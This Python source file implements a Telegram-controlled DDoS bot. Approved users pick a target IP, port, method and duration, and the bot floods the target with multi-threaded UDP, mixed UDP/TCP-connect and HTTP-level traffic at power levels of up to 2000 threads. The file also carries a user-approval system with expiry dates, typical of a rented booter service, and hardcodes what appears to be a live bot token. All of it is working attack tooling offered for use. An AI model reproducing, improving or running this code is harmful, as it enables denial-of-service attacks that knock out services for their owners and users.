# ddos_20x_power.py
import asyncio
import logging
import threading
import time
import random
import socket
import re
import json
import os
from datetime import datetime, timedelta
from typing import Dict, Optional, List
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes
)
from functools import wraps

# ---------- Logging ----------
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ---------- CONFIGURATION ----------
BOT_TOKEN = "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA"
ADMIN_IDS = [8210011971]   # <-- Apni Telegram user ID daal do

BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001, 20002}
MIN_PORT, MAX_PORT = 1, 65535

# ========== 20x POWER SETTINGS ==========
# Power level 1 to 20
# Level 20 = 2000 threads, 20 sockets/thread, delay 0.00002 sec
THREADS_PER_LEVEL = {i: i * 100 for i in range(1, 21)}  # level 20 → 2000 threads
SOCKETS_PER_THREAD = 20       # each thread opens 20 UDP sockets
DELAY_SEC = 0.00002           # 20 microseconds – extremely fast
HTTP_THREADS = 500            # L7 attack threads also increased

# Default power level (start with 10x for safety)
POWER_LEVEL = 10

# Global attack state
attack_running = False
attack_threads = []
current_attack = {
    'ip': None, 'port': None, 'method': None, 'duration': 0,
    'start_time': 0, 'packets': 0, 'message_id': None
}
attack_lock = threading.Lock()
user_data = {}

# ---------- JSON Database (no MongoDB) ----------
USERS_FILE = "users.json"

def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def get_user(user_id):
    users = load_users()
    return users.get(str(user_id))

def create_user(user_id, username=""):
    users = load_users()
    if str(user_id) not in users:
        users[str(user_id)] = {
            "user_id": user_id,
            "username": username,
            "approved": False,
            "expires_at": None,
            "total_attacks": 0,
            "created_at": datetime.now().isoformat()
        }
        save_users(users)
    return users[str(user_id)]

def approve_user(user_id, days):
    users = load_users()
    if str(user_id) in users:
        expires = (datetime.now() + timedelta(days=days)).isoformat()
        users[str(user_id)]["approved"] = True
        users[str(user_id)]["expires_at"] = expires
        save_users(users)
        return True
    return False

def is_user_approved(user_id):
    users = load_users()
    user = users.get(str(user_id))
    if not user or not user.get("approved"):
        return False
    expires = user.get("expires_at")
    if expires and datetime.fromisoformat(expires) < datetime.now():
        return False
    return True

def log_attack(user_id, ip, port, duration, status, method, packets):
    logger.info(f"ATTACK LOG: user={user_id} target={ip}:{port} dur={duration} method={method} pkts={packets} status={status}")

def get_user_stats(user_id):
    return {"total": 0, "successful": 0, "failed": 0, "recent": []}

def get_blocked_ports_list():
    return ", ".join(str(p) for p in sorted(BLOCKED_PORTS))

def admin_required(func):
    @wraps(func)
    async def wrapper(update, context, *args, **kwargs):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Unauthorized")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

# ========== 20x ULTRA POWER ATTACK ENGINE ==========
def udp_flood_20x(ip, port, duration):
    global attack_running, current_attack
    timeout = time.time() + duration
    port = int(port)
    
    # Create multiple UDP sockets per thread
    socks = []
    for _ in range(SOCKETS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            socks.append(s)
        except:
            pass
    
    # Use small payload for speed (256 bytes)
    payload = random._urandom(256)
    
    # Burst send without delay (but small sleep to avoid CPU 100%)
    last_send = time.time()
    while time.time() < timeout and attack_running:
        for sock in socks:
            try:
                sock.sendto(payload, (ip, port))
                with attack_lock:
                    current_attack['packets'] += 1
            except:
                pass
        # Adaptive delay – if packet rate > 500k pps, add tiny delay
        now = time.time()
        if now - last_send < 0.00001:
            time.sleep(0.000005)
        last_send = now
    
    for sock in socks:
        sock.close()

def mixed_flood_20x(ip, port, duration):
    global attack_running, current_attack
    timeout = time.time() + duration
    port = int(port)
    udp_socks = []
    for _ in range(SOCKETS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_socks.append(s)
        except:
            pass
    payload = random._urandom(256)
    
    while time.time() < timeout and attack_running:
        # UDP burst
        for sock in udp_socks:
            try:
                sock.sendto(payload, (ip, port))
                with attack_lock:
                    current_attack['packets'] += 1
            except:
                pass
        # TCP SYN – lightweight
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.05)
            s.connect_ex((ip, port))
            s.close()
            with attack_lock:
                current_attack['packets'] += 1
        except:
            pass
        time.sleep(DELAY_SEC)
    for sock in udp_socks:
        sock.close()

def http_emulate_flood_20x(target_url, duration):
    global attack_running, current_attack
    timeout = time.time() + duration
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    session = requests.Session()
    while time.time() < timeout and attack_running:
        try:
            url = f"{target_url}?rand={random.randint(1,999999)}"
            session.get(url, headers=headers, timeout=3, verify=False)
            with attack_lock:
                current_attack['packets'] += 1
            time.sleep(0.001)  # 1ms delay for HTTP
        except:
            time.sleep(0.01)
    session.close()

def http_connect_flood_20x(target_url, duration):
    global attack_running, current_attack
    timeout = time.time() + duration
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0',
        'Connection': 'close',
    }
    session = requests.Session()
    while time.time() < timeout and attack_running:
        try:
            resp = session.get(target_url, headers=headers, timeout=2, stream=True)
            resp.close()
            with attack_lock:
                current_attack['packets'] += 1
            time.sleep(0.002)
        except:
            time.sleep(0.02)
    session.close()

# ---------- Attack Launcher with Monitoring ----------
def launch_attack(ip, port, duration, method, send_func):
    global attack_running, attack_threads, current_attack

    attack_running = True
    with attack_lock:
        current_attack = {
            'ip': ip, 'port': port, 'method': method, 'duration': duration,
            'start_time': time.time(), 'packets': 0, 'message_id': None
        }

    keyboard = [
        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")],
        [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")],
        [InlineKeyboardButton("❌ CANCEL", callback_data="cancel_attack")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Select attack function and thread count
    if method == 'udp':
        num_threads = THREADS_PER_LEVEL[POWER_LEVEL]
        target_func = udp_flood_20x
        target_args = (ip, port, duration)
        attack_type = f"UDP (20x power, {num_threads} threads)"
    elif method == 'mixed':
        num_threads = THREADS_PER_LEVEL[POWER_LEVEL]
        target_func = mixed_flood_20x
        target_args = (ip, port, duration)
        attack_type = f"Mixed (20x power, {num_threads} threads)"
    elif method == 'http_emulate':
        num_threads = HTTP_THREADS
        target_url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
        target_func = http_emulate_flood_20x
        target_args = (target_url, duration)
        attack_type = f"HTTP-Emulate (L7, {num_threads} threads)"
    elif method == 'http_connect':
        num_threads = HTTP_THREADS
        target_url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
        target_func = http_connect_flood_20x
        target_args = (target_url, duration)
        attack_type = f"HTTP-Connect (L7, {num_threads} threads)"
    else:
        return

    # Send start message
    start_msg = send_func(
        f"🔥 *20x POWER ATTACK STARTING* 🔥\n\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⚙️ Method: `{method.upper()}`\n"
        f"🧵 Threads: `{num_threads}` (Level {POWER_LEVEL}x)\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"💥 Sockets/thread: `{SOCKETS_PER_THREAD}`\n"
        f"_Initializing..._",
        reply_markup, edit=False
    )
    if start_msg:
        current_attack['message_id'] = start_msg.message_id

    # Launch threads
    attack_threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=target_func, args=target_args, daemon=True)
        t.start()
        attack_threads.append(t)

    # Monitor progress
    start_time = time.time()
    last_update = 0
    while attack_running and (time.time() - start_time) < duration:
        time.sleep(0.5)
        elapsed = int(time.time() - start_time)
        if time.time() - last_update >= 1.5:
            last_update = time.time()
            with attack_lock:
                pkt = current_attack['packets']
            progress = int((elapsed / duration) * 20)
            bar = "█" * progress + "░" * (20 - progress)
            speed = int(pkt / elapsed) if elapsed else 0
            text = (
                f"🔥 *20x ATTACK IN PROGRESS* 🔥\n\n"
                f"🎯 `{ip}:{port}`\n"
                f"⚙️ `{method.upper()}`\n"
                f"📦 Packets: `{pkt:,}`\n"
                f"⏱️ Time: `{elapsed}/{duration}s`\n"
                f"📊 `[{bar}]`\n"
                f"💥 Speed: `{speed:,}` pps\n"
                f"🧵 Threads: `{num_threads}`\n\n"
                f"🔘 *Buttons below*"
            )
            try:
                send_func(text, reply_markup, edit=True, msg_id=current_attack['message_id'])
            except:
                pass

    attack_running = False
    for t in attack_threads:
        t.join(timeout=0.5)
    with attack_lock:
        pkt = current_attack['packets']
    avg_speed = int(pkt / duration) if duration else 0
    text = (
        f"✅ *20x ATTACK COMPLETED* ✅\n\n"
        f"🎯 `{ip}:{port}`\n"
        f"📦 Total Packets: `{pkt:,}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"💥 Avg Speed: `{avg_speed:,}` pps\n"
        f"🔋 Power level: `{POWER_LEVEL}x`"
    )
    try:
        send_func(text, None, edit=True, msg_id=current_attack['message_id'])
    except:
        pass

    log_attack(ADMIN_IDS[0], ip, port, duration, "success", method, pkt)

# ---------- TELEGRAM HANDLERS ----------
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    create_user(user_id, username)

    if user_id in ADMIN_IDS and not is_user_approved(user_id):
        approve_user(user_id, 365)
        await update.message.reply_text("✅ Admin auto-approved for 365 days.")

    if is_user_approved(user_id):
        user_data[user_id] = {'step': 'ip'}
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel_setup")]]
        await update.message.reply_text(
            "⚡ *20x POWER DDoS BOT* ⚡\n\n"
            "Send target *IP address*:\nExample: `192.168.1.1`\n\n"
            f"🔥 Current power: `{POWER_LEVEL}x` (max 20x)\n"
            f"🧵 L4 threads at this level: `{THREADS_PER_LEVEL[POWER_LEVEL]}`\n"
            f"🔧 Use `/power 1-20` to change\n\n"
            f"🚀 *Ultra mode*: {SOCKETS_PER_THREAD} sockets/thread, {DELAY_SEC}s delay\n"
            f"⚠️ *Warning*: High power may heat your phone!",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text("❌ *Access Denied*\nContact admin.", parse_mode='Markdown')

async def power_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global POWER_LEVEL
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    if not context.args:
        await update.message.reply_text(
            f"Current power: `{POWER_LEVEL}x` (1-20)\n"
            f"L4 threads: `{THREADS_PER_LEVEL[POWER_LEVEL]}`\n"
            f"Use `/power <1-20>` to change",
            parse_mode='Markdown'
        )
        return
    try:
        level = int(context.args[0])
        if 1 <= level <= 20:
            POWER_LEVEL = level
            await update.message.reply_text(
                f"✅ Power set to `{level}x`\n"
                f"🔄 L4 threads: `{THREADS_PER_LEVEL[level]}`\n"
                f"💥 New attack speed will be {level*100}× faster!"
            )
        else:
            await update.message.reply_text("❌ Level must be 1-20")
    except:
        await update.message.reply_text("❌ Invalid number")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    attack_running = False
    await update.message.reply_text("🛑 Attack stopped immediately")

@admin_required
async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("❌ /approve <user_id> <days>")
        return
    try:
        user_id = int(context.args[0])
        days = int(context.args[1])
        if approve_user(user_id, days):
            await update.message.reply_text(f"✅ User {user_id} approved for {days} days")
            try:
                await context.bot.send_message(user_id, f"✅ Approved for {days} days by admin!")
            except:
                pass
        else:
            await update.message.reply_text("❌ User not found")
    except:
        await update.message.reply_text("❌ Invalid")

@admin_required
async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = load_users()
    if not users:
        await update.message.reply_text("No users")
        return
    msg = "👥 *Registered Users*\n\n"
    for uid, data in list(users.items())[:20]:
        status = "✅" if data.get("approved") else "❌"
        msg += f"`{uid}` {status} – {data.get('total_attacks',0)} attacks\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    if not user:
        await update.message.reply_text("❌ Use /start first")
        return
    status = "✅ Approved" if user.get("approved") else "❌ Not approved"
    expiry = user.get("expires_at")
    exp_str = "Never"
    if expiry:
        days = (datetime.fromisoformat(expiry) - datetime.now()).days
        exp_str = f"{days} days" if days >= 0 else "Expired"
    await update.message.reply_text(
        f"📋 *Your Account*\n\n"
        f"🆔 `{user_id}`\n"
        f"👤 @{user.get('username','N/A')}\n"
        f"📊 {status}\n"
        f"⏰ Expires: {exp_str}\n"
        f"🎯 Total attacks: {user.get('total_attacks',0)}",
        parse_mode='Markdown'
    )

async def blocked_ports_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🚫 *Blocked Ports*\n\n{get_blocked_ports_list()}", parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_admin = user_id in ADMIN_IDS
    msg = (
        "🤖 *20x DDoS Bot Commands*\n\n"
        "/start – Begin attack setup\n"
        "/power 1-20 – Set power level\n"
        "/stop – Stop current attack\n"
        "/myinfo – Account info\n"
        "/blockedports – Show blocked ports\n"
        "/help – This menu\n\n"
        f"⚡ Current power: {POWER_LEVEL}x\n"
        f"🧵 L4 threads: {THREADS_PER_LEVEL[POWER_LEVEL]}\n"
        f"💥 Attack speed: up to {POWER_LEVEL*1000}k pps\n"
    )
    if is_admin:
        msg += "\n👑 *Admin*\n/approve <id> <days>\n/users"
    await update.message.reply_text(msg, parse_mode='Markdown')

# ---------- Interactive Message Handler ----------
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_user_approved(user_id):
        await update.message.reply_text("❌ Not approved")
        return

    step_data = user_data.get(user_id, {})
    step = step_data.get('step')
    text = update.message.text.strip()

    if step == 'ip':
        if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', text):
            await update.message.reply_text("❌ Invalid IP. Send again:")
            return
        step_data['ip'] = text
        step_data['step'] = 'port'
        user_data[user_id] = step_data
        await update.message.reply_text(f"🔌 Send *port* (1-65535):\n🚫 Blocked: {get_blocked_ports_list()}", parse_mode='Markdown')
    elif step == 'port':
        try:
            port = int(text)
            if port < 1 or port > 65535 or port in BLOCKED_PORTS:
                await update.message.reply_text("❌ Invalid or blocked port")
                return
            step_data['port'] = port
            step_data['step'] = 'method'
            user_data[user_id] = step_data
            keyboard = [
                [InlineKeyboardButton("🔥 UDP (20x)", callback_data="method_udp")],
                [InlineKeyboardButton("💣 Mixed (20x)", callback_data="method_mixed")],
                [InlineKeyboardButton("🦊 HTTP-Emulate", callback_data="method_http_emulate")],
                [InlineKeyboardButton("⚡ HTTP-Connect", callback_data="method_http_connect")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_setup")]
            ]
            await update.message.reply_text("⚡ Select attack method:", reply_markup=InlineKeyboardMarkup(keyboard))
        except:
            await update.message.reply_text("❌ Send a number")
    elif step == 'duration':
        try:
            duration = int(text)
            if duration < 5 or duration > 300:
                await update.message.reply_text("❌ Duration 5-300 seconds")
                return
            ip = step_data['ip']
            port = step_data['port']
            method = step_data.get('method', 'udp')
            step_data['final'] = (ip, port, duration, method)
            step_data['step'] = 'confirm'
            user_data[user_id] = step_data
            keyboard = [
                [InlineKeyboardButton("✅ START 20x ATTACK", callback_data="confirm_start")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_setup")]
            ]
            await update.message.reply_text(
                f"🔥 *CONFIRM 20x ATTACK* 🔥\n\n"
                f"🎯 `{ip}:{port}`\n"
                f"⚙️ Method: `{method.upper()}`\n"
                f"⏱️ Duration: `{duration}s`\n"
                f"💪 Power level: `{POWER_LEVEL}x`\n"
                f"🧵 Threads: `{THREADS_PER_LEVEL[POWER_LEVEL]}`\n\n"
                f"⚠️ *This will send massive traffic!*\n"
                f"Start?",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except:
            await update.message.reply_text("❌ Send number")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "cancel_setup":
        if user_id in user_data:
            del user_data[user_id]
        await query.edit_message_text("❌ Setup cancelled")
        return

    if data.startswith("method_"):
        method = data.replace("method_", "")
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]['method'] = method
        user_data[user_id]['step'] = 'duration'
        await query.edit_message_text(f"✅ Method: `{method.upper()}`\n⏱️ Send duration (5-300s):", parse_mode='Markdown')
        return

    if data == "confirm_start":
        if user_id not in user_data or 'final' not in user_data[user_id]:
            await query.edit_message_text("❌ Session expired. Use /start")
            return
        ip, port, duration, method = user_data[user_id]['final']
        del user_data[user_id]

        loop = asyncio.get_event_loop()
        def sync_send(text, markup, edit=False, msg_id=None):
            future = asyncio.run_coroutine_threadsafe(
                query.message.reply_text(text, parse_mode='Markdown', reply_markup=markup), loop
            )
            return future.result() if future.result() else None

        threading.Thread(target=launch_attack, args=(ip, port, duration, method, sync_send), daemon=True).start()
        await query.edit_message_text("🚀 *20x Attack initializing...*\n_Wait a few seconds..._", parse_mode='Markdown')
        return

    # Attack control buttons
    global attack_running, current_attack
    if data == "stop_attack":
        attack_running = False
        await query.edit_message_text("🛑 Attack stopped by user")
    elif data == "info_attack":
        if attack_running:
            with attack_lock:
                pkt = current_attack['packets']
                elapsed = int(time.time() - current_attack['start_time'])
                remaining = current_attack['duration'] - elapsed
                speed = int(pkt/elapsed) if elapsed else 0
                await query.edit_message_text(
                    f"ℹ️ *Attack Info*\n\n"
                    f"🎯 `{current_attack['ip']}:{current_attack['port']}`\n"
                    f"📦 Packets: `{pkt:,}`\n"
                    f"⏱️ Remaining: `{remaining}s`\n"
                    f"💥 Speed: `{speed:,}` pps\n"
                    f"🔋 Power: `{POWER_LEVEL}x`",
                    parse_mode='Markdown'
                )
        else:
            await query.edit_message_text("ℹ️ No active attack")
    elif data == "refresh_attack":
        if attack_running:
            with attack_lock:
                pkt = current_attack['packets']
                elapsed = int(time.time() - current_attack['start_time'])
                remaining = current_attack['duration'] - elapsed
                progress = int((elapsed / current_attack['duration']) * 20)
                bar = "█" * progress + "░" * (20 - progress)
                speed = int(pkt/elapsed) if elapsed else 0
                text = (
                    f"🔥 *20x ATTACK* 🔥\n\n"
                    f"🎯 `{current_attack['ip']}:{current_attack['port']}`\n"
                    f"📦 `{pkt:,}` pkts | ⏱️ `{elapsed}/{current_attack['duration']}s`\n"
                    f"📊 `[{bar}]`\n"
                    f"💥 `{speed:,}` pps\n\n"
                    f"*Buttons below*"
                )
                keyboard = [
                    [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
                    [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")],
                ]
                await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await query.edit_message_text("✅ No attack")
    elif data == "cancel_attack":
        if user_id in user_data:
            del user_data[user_id]
        await query.edit_message_text("❌ Cancelled")

async def error_handler(update, context):
    logger.error(f"Error: {context.error}")

# ---------- MAIN ----------
def main():
    print("💥 20x POWER DDoS BOT STARTING 💥")
    print(f"👑 Admins: {ADMIN_IDS}")
    print(f"⚡ Default power level: {POWER_LEVEL}x → {THREADS_PER_LEVEL[POWER_LEVEL]} threads")
    print(f"🔧 Sockets per thread: {SOCKETS_PER_THREAD} → total {SOCKETS_PER_THREAD * THREADS_PER_LEVEL[POWER_LEVEL]} concurrent streams")
    print(f"⏱️ Delay: {DELAY_SEC} seconds")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("power", power_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("myinfo", myinfo_command))
    app.add_handler(CommandHandler("blockedports", blocked_ports_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("approve", approve_command))
    app.add_handler(CommandHandler("users", users_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_error_handler(error_handler)
    print("✅ Bot is LIVE! Send /start on Telegram")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
